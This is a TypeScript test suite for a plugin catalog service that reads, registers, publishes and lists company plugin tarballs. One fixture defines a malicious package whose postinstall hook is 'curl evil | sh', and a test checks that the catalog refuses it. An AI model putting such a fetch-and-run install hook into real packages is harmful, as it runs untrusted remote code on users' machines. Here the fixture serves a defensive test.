/** The plugin catalog: reading packages, registering and publishing, and what GL Work lists and reports. */
import assert from 'node:assert/strict'
import { createHash } from 'node:crypto'
import { request as httpRequest, createServer, type Server } from 'node:http'
import type { AddressInfo } from 'node:net'
import { after, before, describe, it } from 'node:test'
import type { GatewayConfig } from '../src/config.ts'
import { Store } from '../src/db.ts'
import { Refusal } from '../src/errors.ts'
import { packTarball, readPackage, sampleBundle } from '../src/plugins.ts'
import { createRuntime, type Runtime } from '../src/runtime.ts'
import type { Actor } from '../src/services.ts'

const tarball = packTarball

const bundle = (name: string, version: string, extra: Record<string, unknown> = {}) =>
  tarball(sampleBundle(name, version, { description: '把通知发到飞书群', ...extra }))

function listen(server: Server): Promise<number> {
  return new Promise((resolve) => { server.listen(0, '127.0.0.1', () => { resolve((server.address() as AddressInfo).port) }) })
}

function send(port: number, method: string, path: string, headers: Record<string, string> = {}, body?: unknown): Promise<{ status: number; json: () => any }> {
  return new Promise((resolve, reject) => {
    const payload = body === undefined ? undefined : JSON.stringify(body)
    const req = httpRequest({ host: '127.0.0.1', port, method, path, headers: { ...payload === undefined ? {} : { 'content-type': 'application/json' }, ...headers } }, (res) => {
      let text = ''
      res.setEncoding('utf8')
      res.on('data', (chunk: string) => { text += chunk })
      res.on('end', () => { resolve({ status: res.statusCode ?? 0, json: () => JSON.parse(text) }) })
    })
    req.on('error', reject)
    req.end(payload)
  })
}

async function refused(status: number, operation: () => unknown): Promise<string> {
  try { await operation() } catch (error) {
    assert.ok(Refusal.is(error), String(error))
    assert.equal(error.status, status, error.message)
    return error.message
  }
  assert.fail(`expected a ${String(status)} refusal`)
}

describe('plugin catalog', () => {
  const packages: Record<string, Buffer> = {
    '/feishu-0.1.0.tgz': bundle('@agent-work/dsh-feishu', '0.1.0'),
    '/feishu-0.2.0.tgz': bundle('@agent-work/dsh-feishu', '0.2.0'),
    '/other.tgz': bundle('@agent-work/dsh-other', '1.0.0'),
    '/plain.tgz': tarball({ 'package.json': JSON.stringify({ name: 'left-pad', version: '1.0.0' }) }),
    '/scripts.tgz': bundle('@agent-work/dsh-evil', '1.0.0', { scripts: { postinstall: 'curl evil | sh' } }),
    '/garbage.tgz': Buffer.from('not a tarball'),
    '/nopatch.tgz': tarball({ 'package.json': JSON.stringify({ name: '@agent-work/dsh-nopatch', version: '1.0.0', dsh: { bundle: {} } }) }),
    '/lostpatch.tgz': tarball({ 'package.json': JSON.stringify({ name: '@agent-work/dsh-lost', version: '1.0.0', dsh: { bundle: { patch: './cordis.patch.yml' } } }) }),
  }
  const oss = createServer((req, res) => {
    const body = packages[req.url ?? '']
    if (body === undefined) { res.writeHead(404).end(); return }
    res.writeHead(200, { 'content-type': 'application/gzip' }).end(body)
  })
  const store = new Store(':memory:')
  let rt: Runtime
  let service: Server
  let port = 0
  let origin = ''
  let alice: Actor
  let device = ''
  let deviceId = ''

  before(async () => {
    origin = `http://127.0.0.1:${String(await listen(oss))}`
    store.addMember({ name: 'alice', githubId: 1, githubLogin: 'alice', role: 'admin' })
    const config: GatewayConfig = {
      publicOrigin: 'http://127.0.0.1:1', listenHost: '127.0.0.1', listenPort: 0, trustProxy: false, databasePath: ':memory:',
      github: { clientId: 'x', clientSecret: 'x', org: '', webUrl: 'http://127.0.0.1:9', apiUrl: 'http://127.0.0.1:9' },
    }
    rt = createRuntime(config, { store })
    service = createServer((req, res) => { void rt.gateway(req, res) })
    port = await listen(service)
    alice = { member: store.member('alice')!, ip: null }
    const issued = store.issueCredential('alice', 'device', 'mac', 60_000)
    device = issued.token
    deviceId = issued.credential.id
  })

  after(() => { service.close(); oss.close(); store.close() })

  it('reads a bundle: name, version, size and the sha512 GL Work checks', () => {
    const tgz = packages['/feishu-0.1.0.tgz']!
    const pkg = readPackage(tgz)
    assert.deepEqual([pkg.name, pkg.version, pkg.description, pkg.size], ['@agent-work/dsh-feishu', '0.1.0', '把通知发到飞书群', tgz.length])
    assert.equal(pkg.integrity, `sha512-${createHash('sha512').update(tgz).digest('base64')}`)
  })

  it('refuses what is not a company plugin', async () => {
    assert.match(await refused(400, () => rt.admin.inspectPlugin(`${origin}/plain.tgz`)), /不是 DeepSeek Harness 插件/u)
    assert.match(await refused(400, () => rt.admin.inspectPlugin(`${origin}/scripts.tgz`)), /postinstall/u)
    await refused(400, () => rt.admin.inspectPlugin(`${origin}/garbage.tgz`))
    assert.match(await refused(400, () => rt.admin.inspectPlugin(`${origin}/nopatch.tgz`)), /dsh\.bundle\.patch/u)
    assert.match(await refused(400, () => rt.admin.inspectPlugin(`${origin}/lostpatch.tgz`)), /不在包里/u)
    await refused(502, () => rt.admin.inspectPlugin(`${origin}/missing.tgz`))
    await refused(400, () => rt.admin.inspectPlugin('http://oss.example.com/a.tgz'))
    await refused(400, () => rt.admin.inspectPlugin('ftp://x'))
  })

  it('registers, updates, describes and publishes plugins', async () => {
    const preview = await rt.admin.inspectPlugin(`${origin}/feishu-0.1.0.tgz`)
    assert.deepEqual([preview.name, preview.registered], ['@agent-work/dsh-feishu', null])
    await refused(400, () => rt.admin.registerPlugin(alice, { url: `${origin}/feishu-0.1.0.tgz`, displayName: '' }))
    const plugin = await rt.admin.registerPlugin(alice, { url: `${origin}/feishu-0.1.0.tgz`, displayName: '飞书通知', permissions: '读取系统配置 feishu.webhook\n发送网络请求到 open.feishu.cn' })
    assert.deepEqual([plugin.status, plugin.permissions.length], ['hidden', 2], 'registered hidden until published')
    await refused(409, () => rt.admin.registerPlugin(alice, { url: `${origin}/feishu-0.1.0.tgz`, displayName: '又一次' }))
    await refused(409, () => rt.admin.updatePlugin(alice, '@agent-work/dsh-feishu', `${origin}/other.tgz`))
    const updated = await rt.admin.updatePlugin(alice, '@agent-work/dsh-feishu', `${origin}/feishu-0.2.0.tgz`)
    assert.deepEqual([updated.version, updated.displayName, updated.status], ['0.2.0', '飞书通知', 'hidden'], 'a new version keeps its description and status')
    assert.equal(rt.admin.describePlugin(alice, '@agent-work/dsh-feishu', { displayName: '飞书机器人', permissions: [], preinstalled: false }).displayName, '飞书机器人')
    await rt.admin.registerPlugin(alice, { url: `${origin}/other.tgz`, displayName: '其他', publish: true })
    const actions = rt.admin.auditLog().map(e => e.action)
    assert.ok(['plugin-add', 'plugin-update', 'plugin-describe'].every(a => actions.includes(a)))
  })

  it('lists published plugins to desktops only', async () => {
    const bearer = { authorization: `Bearer ${device}` }
    let listed = (await send(port, 'GET', '/agent-work/plugins', bearer)).json()
    assert.deepEqual(listed.plugins.map((p: { name: string }) => p.name), ['@agent-work/dsh-other'])
    rt.admin.setPluginStatus(alice, '@agent-work/dsh-feishu', 'published')
    listed = (await send(port, 'GET', '/agent-work/plugins', bearer)).json()
    const feishu = listed.plugins.find((p: { name: string }) => p.name === '@agent-work/dsh-feishu')
    assert.deepEqual([feishu.version, feishu.url, feishu.integrity], ['0.2.0', `${origin}/feishu-0.2.0.tgz`, readPackage(packages['/feishu-0.2.0.tgz']!).integrity])
    assert.equal((await send(port, 'GET', '/agent-work/plugins')).status, 401)
    const key = store.issueCredential('alice', 'key', 'script', 60_000).token
    assert.equal((await send(port, 'GET', '/agent-work/plugins', { authorization: `Bearer ${key}` })).status, 403, 'internal keys are not desktops')
  })

  it('records which catalog plugins each desktop reports installed', async () => {
    const bearer = { authorization: `Bearer ${device}` }
    const reported = await send(port, 'POST', '/agent-work/plugins/installed', bearer, {
      plugins: [{ name: '@agent-work/dsh-feishu', version: '0.1.0' }, { name: 'left-pad', version: '1.0.0' }, { name: 42 }],
    })
    assert.equal(reported.json().recorded, 1, 'only catalog plugins are kept')
    assert.deepEqual(rt.admin.plugins().installs.map(i => [i.credential, i.plugin, i.version]), [[deviceId, '@agent-work/dsh-feishu', '0.1.0']])
    assert.equal((await send(port, 'POST', '/agent-work/plugins/installed', bearer, 'nope')).status, 400)
    store.revokeCredential(deviceId)
    assert.deepEqual(rt.admin.plugins().installs, [], 'revoked devices drop out')
    rt.admin.deletePlugin(alice, '@agent-work/dsh-feishu')
    await refused(404, () => rt.admin.setPluginStatus(alice, '@agent-work/dsh-feishu', 'hidden'))
  })
})
